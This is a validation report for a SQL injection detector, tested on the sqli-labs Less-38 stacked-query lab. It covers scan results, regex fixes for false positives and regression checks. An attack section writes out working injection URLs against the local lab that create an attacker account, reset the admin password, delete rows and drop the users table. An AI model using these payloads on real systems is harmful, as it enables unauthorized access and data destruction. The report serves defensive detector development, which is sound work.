# SQL Injection Detector - Validation Report: Less-38

## Overview

| Item | Value |
|------|-------|
| Target | sqli-labs/Less-38 (Stacked Queries SQL Injection) |
| Expected Vulnerability | SQL query with variable interpolation + multi-query execution |
| Test Date | 2026-01-07 |

---

## 1. Initial Scan Result

```
============================================================
SQL INJECTION DETECTOR REPORT
SCAN SUMMARY
Timestamp:       2026-01-07T22:47:42.080470
Files Scanned:   2
Total Findings:  5
Detectors Run:   classic, blind, oob, stacked
============================================================
RESULTS BY FILE

[VULNERABLE] test\sqli-labs\Less-38\index.php
  Finding #1
    Detector:    classic
    Type:        string_concat
    Severity:    HIGH
    Location:    Line 37, Column 39
    Pattern:     double_quote_sql_variable
    Description: SQL query in double quotes with variable interpolation
    Code:        echo "Failed to connect to MySQL: " . mysqli_connect_error();
  Finding #2
    Detector:    classic
    Type:        string_concat
    Severity:    HIGH
    Location:    Line 46, Column 6
    Pattern:     double_quote_sql_variable
    Description: SQL query in double quotes with variable interpolation
    Code:        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  Finding #3
    Detector:    blind
    Type:        boolean_based
    Severity:    MEDIUM
    Location:    Line 53, Column 5
    Pattern:     if_condition
    Description: IF condition pattern - conditional SQL injection
    Code:        if ($result = mysqli_store_result($con1))
  Finding #4
    Detector:    blind
    Type:        boolean_based
    Severity:    MEDIUM
    Location:    Line 55, Column 9
    Pattern:     if_condition
    Description: IF condition pattern - conditional SQL injection
    Code:        if($row = mysqli_fetch_row($result))
  Finding #5
    Detector:    stacked
    Type:        batch_execution
    Severity:    HIGH
    Location:    Line 48, Column 5
    Pattern:     mysqli_multi_query
    Description: mysqli_multi_query() enables stacked queries - high injection risk
    Code:        if (mysqli_multi_query($con1, $sql))

[CLEAN] test\sqli-labs\Less-38\phpinfo.php
  No vulnerabilities detected.
============================================================
```

### Analysis

| Category | Count |
|----------|-------|
| True Positive | 2 |
| False Positive | 3 |

**True Positives (Correct):**
- Line 46: `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`
- Line 48: `mysqli_multi_query($con1, $sql)`

**False Positives (Incorrect):**
- Line 37: `echo "Failed to connect to MySQL: "` - Not SQL, just echo statement
- Line 53: `if ($result = mysqli_store_result($con1))` - PHP if, not SQL IF()
- Line 55: `if($row = mysqli_fetch_row($result))` - PHP if, not SQL IF()

---

## 2. Root Cause

Two pattern bugs identified:

### Bug 1: `double_quote_sql_variable` (php/unsafe_query.yaml)

```yaml
# Before (buggy)
regex: "\"[^\"]*(?:SELECT|INSERT|UPDATE|DELETE)[^\"]*\\$[a-zA-Z_][^\"]*\""
# Matched SQL keyword ANYWHERE in string

# After (fixed)
regex: "\"\\s*(?:SELECT|INSERT|UPDATE|DELETE|REPLACE|MERGE|WITH)\\b[^\"]*\\$[a-zA-Z_][^\"]*\""
# SQL keyword must be at START of string
```

### Bug 2: `if_condition` (common/blind.yaml)

```yaml
# Before (buggy)
regex: "\\bIF\\s*\\([^)]*=[^)]*\\)"
# Matched any IF with = inside parentheses (including PHP if statements)

# After (fixed)
regex: "\\bIF\\s*\\([^,)]+,[^,)]+,[^)]+\\)"
# SQL IF() requires 3 arguments with 2 commas: IF(condition, true_val, false_val)
```

---

## 3. Post-Fix Scan Result

```
============================================================
SQL INJECTION DETECTOR REPORT
SCAN SUMMARY
Timestamp:       2026-01-07T22:59:05.128557
Files Scanned:   2
Total Findings:  2
Detectors Run:   classic, blind, oob, stacked
============================================================
RESULTS BY FILE

[VULNERABLE] test\sqli-labs\Less-38\index.php
  Finding #1
    Detector:    classic
    Type:        string_concat
    Severity:    HIGH
    Location:    Line 46, Column 6
    Pattern:     double_quote_sql_variable
    Description: SQL query in double quotes with variable interpolation
    Code:        $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
  Finding #2
    Detector:    stacked
    Type:        batch_execution
    Severity:    HIGH
    Location:    Line 48, Column 5
    Pattern:     mysqli_multi_query
    Description: mysqli_multi_query() enables stacked queries - high injection risk
    Code:        if (mysqli_multi_query($con1, $sql))

[CLEAN] test\sqli-labs\Less-38\phpinfo.php
  No vulnerabilities detected.
============================================================
END OF REPORT
```

### Verification

| Metric | Before | After |
|--------|--------|-------|
| Total Findings | 5 | 2 |
| True Positives | 2 | 2 |
| False Positives | 3 | 0 |

### Regression Check

| Lesson | Status | Findings |
|--------|--------|----------|
| Less-1 | ✓ Pass | 4 findings, no false positives |
| Less-8 | ✓ Pass | 2 findings, no false positives |

---

## 4. Stacked Queries: Key Concept

### What Makes Less-38 Different

| Lesson | SQL Execution | Stacked Query Support |
|--------|---------------|----------------------|
| Less-1 | `mysqli_query()` | ✗ Single query only |
| Less-8 | `mysqli_query()` | ✗ Single query only |
| **Less-38** | **`mysqli_multi_query()`** | **✓ Multiple queries** |

### Why This Matters

```php
// Less-1/Less-8: mysqli_query() - executes ONE statement
$sql = "SELECT * FROM users WHERE id='$id'";
mysqli_query($con1, $sql);
// Injecting "; DROP TABLE users" → Error (second statement ignored)

// Less-38: mysqli_multi_query() - executes MULTIPLE statements
$sql = "SELECT * FROM users WHERE id='$id'";
mysqli_multi_query($con1, $sql);
// Injecting "; DROP TABLE users" → BOTH statements execute!
```

---

## 5. Attack Demonstration

### Detected Vulnerabilities

| Finding | Line | Code | Risk |
|---------|------|------|------|
| #1 | 46 | `$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";` | SQL Injection |
| #2 | 48 | `mysqli_multi_query($con1, $sql)` | Stacked Query Execution |

The combination of these two vulnerabilities enables devastating attacks.

### Attack Scenarios

#### Step 1: Normal Access
```
http://localhost/sqli-labs/Less-38/?id=1
```
| Your Username | Your Password |
|---------------|---------------|
| Dumb | Dumb |

→ Returns legitimate user data.

#### Step 2: Confirm Basic Injection (UNION)
```
http://localhost/sqli-labs/Less-38/?id=-1' UNION SELECT 1,2,3--+
```
| Your Username | Your Password |
|---------------|---------------|
| 2 | 3 |

→ Basic injection works (same as Less-1).

#### Step 3: Stacked Query - Create New Admin User
```
http://localhost/sqli-labs/Less-38/?id=1'; INSERT INTO users(id,username,password) VALUES(100,'hacker','hacked')--+
```

**What happens:**
1. First query executes: `SELECT * FROM users WHERE id='1'` → Returns Dumb
2. Second query executes: `INSERT INTO users...` → Creates new user!

**Verify:**
```
http://localhost/sqli-labs/Less-38/?id=100
```
| Your Username | Your Password |
|---------------|---------------|
| hacker | hacked |

→ Attacker-created account now exists in database.

#### Step 4: Stacked Query - Modify Existing Data
```
http://localhost/sqli-labs/Less-38/?id=1'; UPDATE users SET password='pwned' WHERE username='admin'--+
```

→ Admin password changed without knowing original password.

#### Step 5: Stacked Query - Delete Data
```
http://localhost/sqli-labs/Less-38/?id=1'; DELETE FROM users WHERE id>1--+
```

→ All users except id=1 deleted from database.

#### Step 6: Stacked Query - Drop Table (Destructive)
```
http://localhost/sqli-labs/Less-38/?id=1'; DROP TABLE users--+
```

→ Entire users table destroyed.

### Attack Flow Diagram

```
Normal Query:
  SELECT * FROM users WHERE id='1' LIMIT 0,1
                             ↑
                         User Input

Stacked Injection:
  SELECT * FROM users WHERE id='1'; INSERT INTO users VALUES(...)--+' LIMIT 0,1
                             ↑      ↑                             ↑
                        Closes    Semicolon                   Comments out
                        quote     separates                   remainder
                                  statements

mysqli_multi_query() execution:
  Statement 1: SELECT * FROM users WHERE id='1'  → Executes ✓
  Statement 2: INSERT INTO users VALUES(...)     → Executes ✓ (DANGEROUS!)
```

### Comparison: Why Stacked is More Dangerous

| Attack Type | Less-1 (mysqli_query) | Less-38 (mysqli_multi_query) |
|-------------|----------------------|------------------------------|
| Read data | ✓ UNION SELECT | ✓ UNION SELECT |
| Create records | ✗ Not possible | ✓ INSERT |
| Modify records | ✗ Not possible | ✓ UPDATE |
| Delete records | ✗ Not possible | ✓ DELETE |
| Drop tables | ✗ Not possible | ✓ DROP TABLE |
| Create backdoor | ✗ Not possible | ✓ INSERT admin user |

### Impact Summary

| Risk | Description |
|------|-------------|
| Complete Data Control | INSERT, UPDATE, DELETE any data |
| Database Destruction | DROP TABLE, DROP DATABASE possible |
| Persistent Backdoor | Create admin accounts for future access |
| Privilege Escalation | Modify user roles and permissions |
| Data Integrity Loss | No reliable data after attack |

---

## 6. Detection Value

### Why Both Findings Matter

| Finding | What It Detects | Value |
|---------|-----------------|-------|
| Line 46 (classic) | Vulnerable SQL construction | Root cause of injection |
| Line 48 (stacked) | Multi-query execution capability | Escalation factor |

The combination tells the security reviewer:
1. SQL injection is possible (Line 46)
2. **AND** stacked queries can be executed (Line 48)
3. Therefore, full database compromise is possible

### Detector Role Validation

| Detector | Expected Role | Less-38 Result |
|----------|---------------|----------------|
| Classic | Detect vulnerable SQL construction | ✓ Line 46 |
| Stacked | Detect multi-statement execution | ✓ Line 48 |
| Blind | Detect SQL-side blind patterns | ✓ Not fired (correct) |
| OOB | Detect dangerous SQL functions | ✓ Not fired (correct) |

---

## Conclusion

- ✓ Primary vulnerability correctly detected (Line 46)
- ✓ Stacked query enabler correctly detected (Line 48)
- ✓ False positives eliminated after pattern fixes
- ✓ Regression tests passed (Less-1, Less-8 unaffected)
- ✓ Stacked Detector validated as functional